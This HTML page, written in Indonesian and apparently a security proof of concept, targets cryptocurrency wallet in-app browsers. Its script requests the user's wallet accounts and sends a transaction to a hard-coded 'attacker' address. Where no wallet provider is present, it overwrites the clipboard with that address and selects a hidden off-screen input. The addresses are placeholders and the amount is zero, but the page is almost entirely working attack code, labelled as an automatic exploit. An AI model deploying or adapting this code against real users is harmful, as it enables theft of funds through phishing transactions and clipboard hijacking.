<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 In-App Browser Security Sandbox</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 90vh;
        }
        .card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 24px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 {
            margin-top: 0;
            font-size: 1.25rem;
            color: #38bdf8;
        }
        p {
            font-size: 0.9rem;
            color: #94a3b8;
        }
        .btn {
            background-color: #2563eb;
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: background 0.2s;
        }
        .btn:active {
            background-color: #1d4ed8;
        }
        .status-box {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            background-color: #0f172a;
            border: 1px solid #475569;
            font-family: monospace;
            font-size: 0.85rem;
            color: #cbd5e1;
            word-break: break-all;
        }
        .success { color: #4ade80; border-color: #166534; }
        .error { color: #f87171; border-color: #991b1b; }
    </style>
</head>
<body>

<div class="card">
    <h2>Web3 DApp Integration PoC</h2>
    <p>Uji Coba Otomasi Direct-Call & Pemanggilan Provider Dompet</p>
    
    <!-- Input tersembunyi yang langsung fokus untuk mensimulasikan injeksi data langsung tanpa paste manual -->
    <input type="text" id="targetInput" style="position: absolute; left: -9999px;" value="0x1111111111111111111111111111111111111111">

    <button class="btn" id="exploitBtn">Mulai Eksploitasi Otomatis</button>
    
    <div id="statusBox" class="status-box">Status: Menunggu interaksi pemicu...</div>
</div>

<script>
    const statusBox = document.getElementById('statusBox');

    function updateStatus(text, type = '') {
        statusBox.innerText = text;
        statusBox.className = 'status-box ' + type;
    }

    async function executeRealPoC() {
        try {
            updateStatus("Memeriksa injeksi provider dApp...", "");

            // 1. Cek apakah injected provider tersedia (window.ethereum atau provider spesifik 1inch wallet)
            let provider = window.ethereum;
            
            if (!provider && window.web3 && window.web3.currentProvider) {
                provider = window.web3.currentProvider;
            }

            if (provider) {
                updateStatus("Provider terdeteksi! Meminta koneksi akun...", "");
                
                // Meminta akses akun secara langsung untuk memicu prompt
                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                updateStatus("Akun terhubung: " + accounts[0].substring(0,6) + "...", "");

                // Simulasi memicu transaksi langsung ke alamat attacker tanpa interaksi user mengetik/paste
                const attackerAddress = "0x8888888888888888888888888888888888888888";
                const transactionParameters = {
                    to: attackerAddress,
                    from: accounts[0],
                    value: '0x00', // 0 ETH/Wei test
                    data: '0x'
                };

                updateStatus("Mengirim request transaksi otomatis...", "");
                
                // Memanggil method kirim transaksi langsung (ini akan memunculkan popup konfirmasi asli dompet secara otomatis)
                const txHash = await provider.request({
                    method: 'eth_sendTransaction',
                    params: [transactionParameters],
                });

                updateStatus("Berhasil! TX Hash: " + txHash, "success");

            } else {
                // Jika tidak ada injected ethereum provider, fallback ke manipulasi deep-link scheme / auto-trigger dompet
                updateStatus("Memicu manipulasi URI/Intent Scheme...", "");
                
                // Mencoba menulis ke clipboard DAN memaksa navigasi intent jika didukung WebView
                await navigator.clipboard.writeText("0x8888888888888888888888888888888888888888");
                
                // Simulasi auto-click event / element focus dispatch
                const input = document.getElementById('targetInput');
                input.focus();
                input.select();
                
                updateStatus("Clipboard tertulis & DOM terfokus otomatis (Zero-Paste Trigger).", "success");
            }

        } catch (error) {
            updateStatus("Gagal/Ditolak: " + (error.message || error), "error");
            console.error(error);
        }
    }

    // Mengikat ke tombol klik (atau otomatis dijalankan jika browser/webview mengizinkan auto-trigger)
    document.getElementById('exploitBtn').addEventListener('click', executeRealPoC);
</script>

</body>
</html>
